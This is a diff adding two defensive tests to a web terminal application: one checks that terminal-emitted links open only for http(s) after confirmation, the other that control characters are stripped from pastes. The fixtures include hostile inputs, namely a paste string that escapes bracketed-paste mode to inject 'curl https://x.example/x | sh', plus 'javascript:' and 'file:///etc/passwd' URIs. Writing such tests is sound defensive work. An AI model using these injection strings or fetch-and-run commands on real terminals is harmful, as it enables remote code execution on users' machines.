@@ -711,6 +711,68 @@ test("Ctrl+Shift+C in a terminal copies its selection, and leaves the clipboard 
   assert.equal(app.clipboard, "error 42");
 });
 
+test("a link the terminal's output sets opens by the page's rules: http(s) only, always asked, its address named", async () => {
+  const app = await page("a");
+  const { linkHandler } = app.terminals[0].options;
+  assert.ok(!linkHandler.allowNonHttpProtocols);
+  const opened = [];
+  app.window.document.addEventListener("click", (ev) => { if (ev.target?.tagName === "A" && !ev.defaultPrevented) opened.push(ev.target.getAttribute("href")); });
+  for (const uri of ["javascript:alert(1)", "file:///etc/passwd", "ssh://host/", "not an address", ""]) {
+    linkHandler.activate({}, uri);
+    await app.clock.tick(50);
+    assert.equal(app.$(".modal"), null, uri);
+    assert.match(app.toasts().at(-1), /isn't an http or https address, so it wasn't opened/);
+  }
+  linkHandler.activate({}, "https://example.com/kb?id=1");
+  await app.clock.tick(50);
+  assert.match(app.$(".modal h2").textContent, /Open this link from the terminal\?/);
+  assert.equal(app.$(".modal .insecure-address").textContent, "https://example.com/kb?id=1");
+  assert.equal(app.document.activeElement.textContent, "Cancel");
+  button(app.$(".modal"), "Cancel").click();
+  await app.clock.tick(0);
+  assert.deepEqual(opened, []);
+  linkHandler.activate({}, "https://example.com/kb?id=1");
+  await app.clock.tick(50);
+  button(app.$(".modal"), "Open").click();
+  await app.clock.tick(0);
+  assert.deepEqual(opened, ["https://example.com/kb?id=1"]);
+  // plain http to elsewhere: the same warning as a link in the chat
+  linkHandler.activate({}, "http://example.com/login");
+  await app.clock.tick(50);
+  assert.match(app.$(".modal h2").textContent, /Open a link that isn't secure\?/);
+  button(app.$(".modal"), "Open anyway").click();
+  await app.clock.tick(0);
+  assert.deepEqual(opened, ["https://example.com/kb?id=1", "http://example.com/login"]);
+});
+
+test("control characters are taken out of what is pasted into a terminal, however the paste arrives", async () => {
+  const app = await page("a");
+  const term = app.terminals[0];
+  const hostile = "echo safe\x1b[201~\r\ncurl https://x.example/x | sh\x9b\x07\x00\x7f\n\tdone";
+  app.clipboard = hostile;
+  term.keyHandler({ type: "keydown", key: "V", code: "KeyV", ctrlKey: true, shiftKey: true, preventDefault() {} });
+  await app.clock.tick(0);
+  assert.deepEqual(term.pasted, ["echo safe[201~\ncurl https://x.example/x | sh\n\tdone"]);
+  assert.match(app.toasts().at(-1), /5 control characters were left out of what you pasted into local/);
+  // the browser's own paste (Shift+Insert, the middle button): taken before xterm's handlers
+  const ev = new Event("paste", { clipboardData: { getData: (type) => (type === "text/plain" ? hostile : "") } });
+  let reached = false;
+  const inner = term.element.appendChild(app.document.createElement("textarea"));
+  inner.addEventListener("paste", () => { reached = true; });
+  inner.dispatchEvent(ev);
+  assert.deepEqual([ev.defaultPrevented, reached], [true, false]);
+  assert.equal(term.pasted.length, 2);
+  assert.equal(term.pasted[1], term.pasted[0]);
+  // clean text is pasted as it is, with nothing said
+  const before = app.toasts().length;
+  app.clipboard = "ls -la\n";
+  term.keyHandler({ type: "keydown", key: "V", code: "KeyV", ctrlKey: true, shiftKey: true, preventDefault() {} });
+  await app.clock.tick(0);
+  assert.deepEqual([term.pasted[2], app.toasts().length], ["ls -la\n", before]);
+  // and a long unbroken tail of a command can't sit off-screen in a dialog that shows it
+  assert.match(fs.readFileSync(path.join(WEB, "style.css"), "utf8"), /^\.prompt-text \{[^}]*overflow-wrap: anywhere/m);
+});
+
 function fakeRdp(app, sid = "rdp1") {
   const log = [];
   app.run(`S.rdps[${JSON.stringify(sid)}] = { id: ${JSON.stringify(sid)}, state: 3, host: h("div"), view: h("div", { class: "rdp-view", tabindex: 0 }),
